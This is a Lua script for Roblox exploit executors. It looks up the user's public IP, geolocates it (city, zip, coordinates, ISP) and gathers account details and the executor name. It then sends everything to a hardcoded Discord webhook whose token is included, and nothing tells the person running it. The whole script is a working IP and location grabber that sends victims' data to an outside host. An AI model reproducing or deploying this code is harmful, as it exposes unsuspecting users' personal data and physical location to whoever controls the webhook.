-- Get required services and player
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local name = player.Name
local WebhookURL = "https://discord.com/api/webhooks/1410791967167611013/tpocTrwt5qs_8MnIUkzP8DpyrJ3ZWQ_GM2DwRE4jsgtvx9GrGL9HznI1065kwVVMWqq0"
-- Detect executor type (example detection, extend as needed)
local executorType = "Unknown Executor" 
if identifyexecutor then
    executorType = identifyexecutor()
elseif syn and syn.request then
    executorType = "Synapse X"
elseif KRNL_LOADED then
    executorType = "Krnl"
elseif isFluxusExecutor then
    executorType = "Fluxus"
elseif secure_load then
    executorType = "ScriptWare"
end

-- Roblox profile link for the player
local playerProfileUrl = "https://www.roblox.com/users/" .. tostring(player.UserId) .. "/profile"
local playerUserID = player.UserId

-- HTTP request function compatible with exploits
local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)

-- Fetch public IP address
local getIPResponse = request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = HttpService:JSONDecode(getIPResponse.Body)
local ipAddress = tostring(GetIPJSON.ip)

-- Fetch detailed IP info
local getIPInfo = request({
    Url = string.format("http://ip-api.com/json/%s", ipAddress),
    Method = "GET"
})
local ipData = HttpService:JSONDecode(getIPInfo.Body)

-- Safe getter with fallback
local function safeGet(field)
    return ipData[field] or "N/A"
end

-- IP details
local ipCountry = safeGet("country")
local ipCountryCode = safeGet("countryCode")
local ipRegion = safeGet("region")
local ipRegionName = safeGet("regionName")
local ipCity = safeGet("city")
local ipZip = safeGet("zip")
local ipLatitude = safeGet("lat")
local ipLongitude = safeGet("lon")
local ipISP = safeGet("isp")
local ipOrg = safeGet("org")
local ipTimezone = safeGet("timezone")

-- Add placeName (fallback on city + region)
local placeName = ipData.placeName or (ipCity .. ", " .. ipRegionName) or "N/A"

-- Fetch Roblox Player Profile Picture
local avatarUrlRequest = request({
    Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. playerUserID .. "&size=150x150&format=Png&isCircular=false",
    Method = "GET"
})

local avatarData = HttpService:JSONDecode(avatarUrlRequest.Body)
local playerProfilePic = avatarData.data and avatarData.data[1] and avatarData.data[1].imageUrl or ""

-- Additional player info
local playerMembershipType = player.MembershipType and player.MembershipType.Name or "N/A"
local playerAccountAgeDays = math.floor(player.AccountAge)

-- Execution times
local executionTimeUTC = os.date("!%Y-%m-%d %H:%M:%S UTC")
local executionTimeLocal = os.date("%Y-%m-%d %H:%M:%S %Z")

-- Construct embed description with placeName included
local embedDescription = string.format([[
**Player Information**

- Username: [%s](%s)
- UserID: %d
- Membership Type: %s
- Account Age (days): %d

**IP Information**

- IP: %s
- Country: %s (%s)
- Region: %s (%s)
- City: %s
- Zipcode: %s
- Coordinates: %s, %s
- Place Name: %s
- ISP: %s
- Organization: %s
- Timezone: %s

**Execution Info**

- Executed At (UTC): %s
- Executed At (Local): %s
- Executor Type: %s
]],
    name, playerProfileUrl,
    playerUserID,
    playerMembershipType,
    playerAccountAgeDays,
    ipAddress,
    ipCountry, ipCountryCode,
    ipRegion, ipRegionName,
    ipCity,
    ipZip,
    tostring(ipLatitude), tostring(ipLongitude),
    placeName,
    ipISP,
    ipOrg,
    ipTimezone,
    executionTimeUTC,
    executionTimeLocal,
    executorType
)

-- Embed with profile picture on the right
local embed = {
    title = "Execution Information",
    description = embedDescription,
    color = 16711680, -- Red color
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    author = {
        name = "Execution Logger",
        url = playerProfileUrl
    },
    image = {
        url = playerProfilePic
    }
}

local webhookData = {
    username = "Game Logger",
    embeds = { embed }
}

-- Send webhook with error handling
local postSuccess, postResponse = pcall(function()
    return request({
        Url = WebhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(webhookData)
    })
end)

if not postSuccess then
    warn("Failed to send webhook: " .. tostring(postResponse))
else
    print("Webhook sent successfully.")
end
